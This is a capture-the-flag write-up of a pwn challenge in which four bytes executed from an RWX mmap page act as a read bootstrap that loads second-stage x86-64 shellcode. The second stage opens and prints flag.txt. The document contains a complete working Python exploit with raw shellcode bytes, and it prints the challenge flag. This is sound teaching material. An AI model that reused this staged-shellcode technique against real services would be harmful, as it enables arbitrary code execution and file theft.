# 🕵️ Securinets CTF Friendly 2026 — 2nd Download

> **Category:** Pwn — Staged Shellcode  
> **Difficulty:** Medium  
> **Points:** 310  
> **Author:** r3t0x  
> **Flag:** `Securinets{th3_s3c0nd_d0wnl04d_c4rr13d_th3_r34l_l34k}`

---

# 🌌 ERA I — Pwn

Pwn challenges ask us to reason about how a process uses memory and how input can cross a boundary the author intended to be safe. In shellcode challenges, the central questions are where bytes land, whether that memory is executable, and how control flow reaches it.

Staged shellcode is useful when an initial input is intentionally tiny. Rather than force a complete payload into the first read, the first fragment becomes a loader: it performs another read into a known location, then continues into the newly supplied stage.

This episode focuses on `mmap`, executable memory, exact-length reads, and the Linux x86-64 syscall ABI. The mindset is to track both the mapping and the live register values at the indirect call.

---

# 📺 EPISODE 02 — 2nd Download

## 🎬 The Briefing

**Challenge description:**

> Rockstar's relay records only the beginning of every transfer before launching it. CyberLeek knows the opening fragment was never meant to contain the entire build.  
> It only needs to make room for what comes next.

### 🗺️ Mission

**Objective:** Use the four-byte initial fragment to load and execute a second stage that reads and prints the remote flag.

**Given:**

- `main(6)`, a PIE x86-64 binary
- Remote service
- A challenge libc and loader (not needed by the final shellcode)

**Target:**

```text
pwn.friendly-ctf.securinets.tn:9008
```

---

# 🧩 Scene 1 — First Contact

```bash
nc pwn.friendly-ctf.securinets.tn 9008
```

The service prints:

```text
THE SECOND DOWNLOAD
Rockstar accepted the beginning of the transfer.
FIRST FRAGMENT:
```

### 👀 What do we notice?

- The program explicitly calls the input a *fragment*.
- It reads a short prefix before transferring control to that data.
- The binary imports `mmap`, suggesting it may create a dedicated payload region.

### 🧠 First Hypothesis

> The first transfer is a bootstrap rather than the whole exploit. If the program calls an executable mapping after the four-byte read, those four bytes can issue a second `read` into the same mapping.

We need to prove the mapping permissions, exact input size, initial register state, and offset at which the second-stage code begins.

---

# 🔬 Scene 2 — Examining the Evidence

## 📦 Step 1 — Identify the Target

```bash
file 'main(6)'
readelf -h 'main(6)' | grep Type
readelf -l 'main(6)' | grep -E 'GNU_STACK|GNU_RELRO' -A1
nm -n 'main(6)' | grep -E ' (main|read_exact)$'
```

Key results:

```text
ELF 64-bit LSB PIE executable, x86-64
Type: DYN (Position-Independent Executable file)
GNU_STACK: RW (non-executable stack)
GNU_RELRO: present; PLT is protected by the normal partial-RELRO layout
main: 0x1214 (relative ELF address)
read_exact: 0x1189 (relative ELF address)
```

### What does this tell us?

| Finding | Meaning | Why it matters |
|---|---|---|
| PIE | Main binary is relocated | Irrelevant to the shellcode route because execution begins in an mmap page returned at runtime |
| NX stack | Stack is not executable | We avoid running code from the stack |
| Stack canary | Present in helper/main frames | We do not overwrite those frames' return addresses |
| RWX `mmap` | The program requests `PROT_READ | PROT_WRITE | PROT_EXEC` | The mapped page is both writable and executable |
| `read_exact(page, 4)` | Exactly four bootstrap bytes are loaded | A tiny first stage can ask the process to read the real payload |

---

# 🧠 Scene 3 — Understanding the Program

## 📖 Reading the Source

The recovered control flow is equivalent to:

```c
void *page = mmap(NULL, 0x1000,
                  PROT_READ | PROT_WRITE | PROT_EXEC,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

puts("THE SECOND DOWNLOAD");
puts("Rockstar accepted the beginning of the transfer.");
printf("FIRST FRAGMENT: ");

if (read_exact(page, 4)) {
    // At this call site: rdi = 0, rsi = page, rdx = 0x1000.
    ((void (*)(void))page)();
}
```

`read_exact` loops until it has received the requested number of bytes or a read fails. The call site then transfers control to the mapping.

### 🔎 The suspicious part

```c
read_exact(page, 4);
((void (*)(void))page)();
```

The first four bytes are executed before any further data is read. The registers set immediately before the indirect call happen to be valid arguments for `read(0, page, 0x1000)`:

- `rdi = 0` — standard input
- `rsi = page` — destination
- `rdx = 0x1000` — maximum bytes

The first stage only needs to set `rax = 0` (the Linux `read` syscall number) and invoke `syscall`.

### What the program thinks is happening

```text
Receive four bytes
    ↓
Launch the fragment as a program
    ↓
Finish the transfer
```

### What is actually happening

```text
Receive 4 bytes into an RWX page
    ↓
Execute: xor eax,eax; syscall
    ↓
read(0, page, 0x1000) overwrites page with stage two
    ↓
Execution resumes at page + 4
    ↓
Stage two opens and prints flag.txt
```

---

# 💥 Scene 4 — Finding the Vulnerability

## 🚨 Vulnerability

**Type:** Unrestricted execution of an attacker-controlled bootstrap in an RWX mapping, enabling staged shellcode.

### The root cause

The program gives the user control over the first instructions executed from a writable and executable page. It does not constrain what those instructions do or prevent them from reading a larger second stage.

### Why is it exploitable?

1. The first four bytes execute in the mapped page.
2. The call-site registers already describe a `read` into that page.
3. A two-instruction bootstrap sets the syscall number and enters the kernel.
4. The second input overwrites the first four page bytes and continues after them.
5. The process executes the second stage from the same RWX mapping.

### The primitive

> **A four-byte arbitrary syscall bootstrap followed by a second-stage read into executable memory.**

This removes the size restriction: the first fragment is only a loader, while the next transfer contains the file-reading code.

---

# 🧪 Scene 5 — Experimentation

### Experiment #1 — Confirm the staged read

The first fragment is:

```text
31 c0 0f 05
```

These bytes decode as:

```asm
xor eax, eax       ; SYS_read = 0
syscall            ; read(0, page, 0x1000), using existing registers
```

### Experiment #2 — Prove execution after the overwrite

The second transfer begins with four placeholder bytes (`JUNK`) followed by shellcode that writes a marker. Since the `read` starts at the mapping base, those four bytes replace the bootstrap; the CPU resumes at offset `+4` after the syscall returns.

The harmless marker `MARK` was returned, confirming the stage-two offset and the executable mapping.

### What did we learn?

- The second stage begins at `page + 4`, not at `page`.
- The socket can receive the bootstrap and stage two on the same connection; the kernel buffers the second transfer until the shellcode calls `read`.
- The target's working directory is `/app`, and the file is named `flag.txt`.

---

# 🧭 Scene 6 — The Turning Point

At this point, we know:

- A 4-byte first stage can make room for a larger read.
- The mapping is executable and the call-site registers provide the read arguments.
- A marker shellcode confirms that control continues at offset four.

But we still need to turn the stage-two input into a clean output channel.

The key question becomes:

> **Can stage two use direct Linux syscalls to open, read, and write the flag without relying on libc or a shell?**

### 💡 The breakthrough

Yes. A compact x86-64 syscall sequence can open `flag.txt` with `O_RDONLY`, read up to 256 bytes into stack space, and write exactly the returned byte count to file descriptor 1. This avoids libc offsets and avoids needing to spawn a shell.

---

# 🧠 Scene 7 — Building the Exploit

## 🎯 Exploit Strategy

```text
Send four-byte syscall bootstrap
      ↓
Bootstrap reads up to 0x1000 bytes into the RWX page
      ↓
Send 4-byte filler + stage-two code
      ↓
Stage two opens "flag.txt"
      ↓
Read file contents
      ↓
Write the bytes to the network-backed stdout
```

## 🔧 Step 1 — Bootstrap read

```python
stage1 = b"\x31\xc0\x0f\x05"  # xor eax,eax; syscall
```

### Why does this work?

Before the indirect call, the process has `rdi=0`, `rsi=page`, and `rdx=0x1000`. The bootstrap only needs to set `eax=0` so `syscall` performs `read`.

## 🔧 Step 2 — Start stage two at offset four

```python
sock.sendall(stage1)
sock.sendall(b"JUNK" + stage2)
```

### Why does this work?

The bootstrap's `read` starts writing at page offset zero. `JUNK` occupies offsets 0–3; execution resumes at offset 4, exactly where `stage2` starts.

## 🔧 Step 3 — Open and print the flag

The stage uses `open`, `read`, and `write` syscalls. It builds the NUL-terminated path `flag.txt` on the stack, reads the file into a scratch buffer, and writes only the bytes returned by `read`.

---

# 🧬 Scene 8 — The Final Exploit

```python
#!/usr/bin/env python3
import socket

HOST, PORT = "pwn.friendly-ctf.securinets.tn", 9008
stage1 = b"\x31\xc0\x0f\x05"  # read(0, mapped_page, 0x1000)

# Build "flag.txt\0", open it, read 256 bytes, and write them to stdout.
stage2 = (
    b"\x31\xc0\x50"                    # xor eax,eax; push 0
    b"\x48\xbbflag.txt"                # mov rbx, "flag.txt"
    b"\x53\x48\x89\xe7"               # push rbx; rdi = pathname
    b"\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05"  # open(path, O_RDONLY)
    b"\x89\xc7"                        # edi = returned fd
    b"\x48\x81\xec\x00\x01\x00\x00"  # reserve 0x100-byte buffer
    b"\x48\x89\xe6\xba\x00\x01\x00\x00"  # rsi=buffer; rdx=0x100
    b"\x31\xc0\x0f\x05"               # read(fd, buffer, 0x100)
    b"\x89\xc2\xbf\x01\x00\x00\x00"  # edx=nread; edi=stdout
    b"\xb8\x01\x00\x00\x00\x0f\x05"  # write(1, buffer, nread)
    b"\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05"  # exit(0)
)

with socket.create_connection((HOST, PORT), timeout=5) as sock:
    print(sock.recv(4096).decode(errors="replace"), end="")
    sock.sendall(stage1)
    sock.sendall(b"JUNK" + stage2)
    sock.settimeout(3)
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        print(data.decode(errors="replace"), end="")
```

### Exploit walkthrough

| Code / function | Purpose |
|---|---|
| `stage1` | Invokes a second `read` into the mapping |
| `b"JUNK" + stage2` | Preserves the page+4 execution offset |
| `open` syscall | Opens the relative `/app/flag.txt` file |
| `read` / `write` syscalls | Transfers the flag bytes back to the client |

---

# 🏁 Scene 9 — The Final Confrontation

```bash
python3 exploit.py
```

The live service returned:

```text
Securinets{th3_s3c0nd_d0wnl04d_c4rr13d_th3_r34l_l34k}
```

> _The opening fragment did not carry the whole build. It carried the code that made room for it._

---

# 🧠 Post-Mission Analysis

## 🔑 What was the actual vulnerability?

The program executed four attacker-controlled bytes in an RWX mapping and supplied them with a useful register state. Those bytes could perform another read into the same executable mapping.

## 🎯 What was the intended exploitation path?

Use `xor eax,eax; syscall` as a four-byte `read` bootstrap, then execute a second stage at offset `+4` that opens and prints the flag.

## 🧰 Important techniques

- **Staged shellcode** — a tiny first stage loads a larger second stage.
- **Syscall ABI** — use pre-populated registers to avoid setup code.
- **RWX mapping analysis** — verify where code can be written and executed.

## 🧩 The mental model

```text
Four-byte read bootstrap
       ↓
Second input into RWX memory
       ↓
Syscall shellcode
       ↓
Open/read/write flag.txt
```

---

# 🧪 What I Learned

### Before the challenge

> Four bytes seemed too few to do anything meaningful.

### During the challenge

> The initial bytes only needed to launch a second read using registers the program had already prepared.

### After the challenge

> When a challenge is staged, identify the live register state at each indirect call before writing a loader.

### The lesson

> **A tiny fragment can be a complete exploit if it can ask for the next fragment.**

---

# 📚 Concepts Worth Reviewing

- Linux x86-64 syscall calling convention
- `mmap` protections and RWX memory
- Staged shellcode and socket buffering
- `open`, `read`, `write`, and file descriptors

### Recommended learning order

```text
x86-64 registers and syscalls
     ↓
Executable memory and mmap
     ↓
Bootstrap/read stages
     ↓
2nd Download
```

---

# 🗂️ Investigation Summary

| Phase | What happened |
|---|---|
| **Recon** | Observed the “first fragment” prompt and four-byte read |
| **Analysis** | Found a 0x1000-byte RWX mapping and indirect call |
| **Vulnerability** | Attacker-controlled fragment executes before input is complete |
| **Primitive** | Second `read` into executable memory |
| **Strategy** | Load a file-reading stage at mapping offset four |
| **Exploitation** | Syscalls opened, read, and wrote `/app/flag.txt` |
| **Flag** | `Securinets{th3_s3c0nd_d0wnl04d_c4rr13d_th3_r34l_l34k}` |

---

# 🎬 END OF EPISODE

> **Episode 02 — 2nd Download**  
> **Status:** ✅ Solved  
> **Category:** Pwn  
> **Difficulty:** Medium  
> 
> _The case is closed._
> 
> _For now._

---

# 🔮 NEXT EPISODE

> **Next challenge:** `Wrong Turn`  
> _New target. New vulnerability. New rules._

---

# 📖 ERA INDEX

## ERA I — Pwn

### Episode 01 — Short Fuse

`NUL-bypass format string → GOT write → libc/system`

### Episode 02 — 2nd Download

`Four-byte bootstrap → second-stage shellcode → flag read`

### Episode 03 — Wrong Turn

`Saved-RIP overwrite → jmp rsi → executable-stack shellcode`

---

# 🗺️ COMPLETE CTF JOURNEY

```text
                    SECURINETS FRIENDLY 2026
                              │
                           ERA I — PWN
                              │
                 ┌────────────┼────────────┐
                 │            │            │
           EPISODE 01    EPISODE 02    EPISODE 03
           Short Fuse    2nd Download  Wrong Turn
                 ✓            ✓            ✓
```

> **Every era teaches a different way of thinking.**  
> **Every episode adds another piece to the map.**
